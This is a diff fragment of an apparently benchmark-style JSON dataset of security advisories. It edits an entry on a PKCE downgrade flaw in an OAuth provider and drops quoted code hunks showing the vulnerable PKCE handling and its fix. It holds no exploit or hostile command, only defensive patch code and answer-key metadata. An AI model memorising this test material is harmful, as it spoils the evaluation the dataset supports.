+      "source_url": "https://github.com/cloudflare/workers-oauth-provider/commit/d954473f066f0daa3949717fd4d6e805d2ac618b"
+     }
+    ],
+    "candidate_patch_sha256": "dcf4c52fc0f0a1dda6403c48553be96d99d1146647adc0ea3a961108426ab71d",
+    "required_anchors": {
+     "candidate": [
+      "codeChallenge"
+     ],
+     "fix": [
+      "!isPkceEnabled"
+     ]
+    },
+    "fix_url": "https://github.com/cloudflare/workers-oauth-provider/commit/d954473f066f0daa3949717fd4d6e805d2ac618b",
+    "fix_files": [
+     "src/oauth-provider.ts"
+    ],
+    "fix_patch_sha256": "6832eb4bef842320e8fa7bf1565cfc391a3635fd215a8e30ce07046d33cc0f37",
+    "steps": [
      {
       "title": "Security fix",
       "detail": "Rejects a token request that supplies code_verifier when the stored authorization grant has no codeChallenge, closing the PKCE downgrade mismatch before any tokens are issued."
      }
     ],
-    "display_hunks": [
-     {
-      "file": "oauth-provider.ts",
-      "code": "@@ -172,6 +172,16 @@ export interface AuthRequest {\n    * Client state value to be returned in the redirect\n    */\n   state: string;\n+\n+  /**\n+   * PKCE code challenge (RFC 7636)\n+   */\n+  codeChallenge?: string;\n+\n+  /**\n+   * PKCE code challenge method (plain or S256)\n+   */\n+  codeChallengeMethod?: string;\n }\n \n /**\n@@ -329,6 +339,18 @@ export interface Grant {\n    * Only present during the authorization code exchange process\n    */\n   authCodeId?: string;\n+\n+  /**\n+   * PKCE code challenge for this authorization\n+   * Only present during the authorization code exchange process\n+   */\n+  codeChallenge?: string;\n+\n+  /**\n+   * PKCE code challenge method (plain or S256)\n+   * Only present during the authorization code exchange process\n+   */\n+  codeChallengeMethod?: string;\n }\n \n /**\n@@ -520,6 +542,7 @@ export class OAuthProvider {\n       scopes_supported: [], // This could be configured in the future\n       response_modes_supported: [\"query\"],\n       revocation_endpoint: this.options.tokenEndpoint, // Reusing token endpoint for revocation\n+      code_challenge_methods_supported: [\"plain\", \"S256\"], // PKCE support\n     };\n \n     return new Response(JSON.stringify(metadata), {\n@@ -632,6 +655,7 @@ export class OAuthProvider {\n   ): Promise<Response> {\n     const code = body.code;\n     const redirectUri = body.redirect_uri;\n+    const codeVerifier = body.code_verifier;\n \n     if (!code) {\n       return createErrorResponse(\n@@ -695,6 +719,38 @@ export class OAuthProvider {\n       );\n     }\n \n+    // Verify PKCE code_verifier if code_challenge was provided during authorization\n+    if (grantData.codeChallenge) {\n+      if (!codeVerifier) {\n+        return createErrorResponse(\n+          'invalid_request',\n+          'code_verifier is required for PKCE'\n+        );\n+      }\n+\n+      // Verify the code verifier against the stored code challenge\n+      let calculatedChallenge: string;\n+\n+      if (grantData.codeChallengeMethod === 'S256') {\n+        // SHA-256 transformation for S256 method\n+        const encoder = new TextEncoder();\n+        const data = encoder.encode(codeVerifier);\n+        const hashBuffer = await crypto.subtle.digest('SHA-256', data);\n+        const hashArray = Array.from(new Uint8Array(hashBuffer));\n+        calculatedChallenge = base64UrlEncode(String.fromCharCode(...hashArray));\n+      } else {\n+        // Plain method, direct comparison\n+        calculatedChallenge = codeVerifier;\n+      }\n+\n+      if (calculatedChallenge !== grantData.codeChallenge) {\n+        return createErrorResponse(\n+          'invalid_grant',\n+          'Invalid PKCE code_verifier'\n+        );\n+      }\n+    }\n+\n     // Code is valid - generate tokens\n     const accessTokenSecret = generateRandomString(TOKEN_LENGTH);",
-      "annotation": "The OAuth provider advertises PKCE methods and stores a code challenge and method on the auth request and grant, but the token exchange only verifies the challenge when it was previously recorded. A client that ignores PKCE can still complete the code flow because challenge is optional throughout authorization.",
-      "role": "candidate"
-     },
-     {
-      "file": "src/oauth-provider.ts",
-      "code": "@@ -1235,6 +1235,11 @@ class OAuthProviderImpl {\n       return this.createErrorResponse('invalid_grant', 'Invalid redirect URI');\n     }\n \n+    // Reject if code_verifier is provided but PKCE wasn't used in authorization\n+    if (!isPkceEnabled && codeVerifier) {\n+      return this.createErrorResponse('invalid_request', 'code_verifier provided for a flow that did not use PKCE');\n+    }\n+\n     // Verify PKCE code_verifier if code_challenge was provided during authorization\n     if (isPkceEnabled) {\n       if (!codeVerifier) {",
-      "annotation": "The token endpoint now rejects a code_verifier that arrives for a grant that never used PKCE, so clients cannot silently skip the challenge, and verifier math is only applied when PKCE was in effect.",
-      "role": "fix"
-     }
-    ],
-    "candidate_patch_sha256": "3de8bb49c32e8beee76b02b2fa3bb4f36d1ba798f6c8caf79980959ba1e28671",
-    "fix_patch_sha256": "5c1d77d1a3ae3111479d47e53a2452c7abf2e767c7cee649e99f3c660d87a4f9",
     "candidate_patch_files": [
      "oauth-provider.ts"
     ],
     "fix_patch_files": [
-     "src/oauth-provider.ts"
-    ],
-    "annotation_mode": "hunk_specific",
-    "required_anchors": {
-     "candidate": [
-      "codeChallenge",
-      "code_challenge_methods_supported"
-     ],
-     "fix": [
-      "isPkceEnabled",
-      "code_verifier"
-     ]
-    },
-    "fix_files": [
      "src/oauth-provider.ts"
     ]
    },
@@ -42496,7 +42444,7 @@
    "unpatched": null,
    "advisory_url": "https://github.com/advisories/ghsa-qgp8-v765-qxx9",
    "publication_issues": [],
-   "publication_status": "confirmed"
+   "publication_status": "provisional"
   },
   {
    "case_id": "GHSA-4PC9-X2FX-P7VJ",
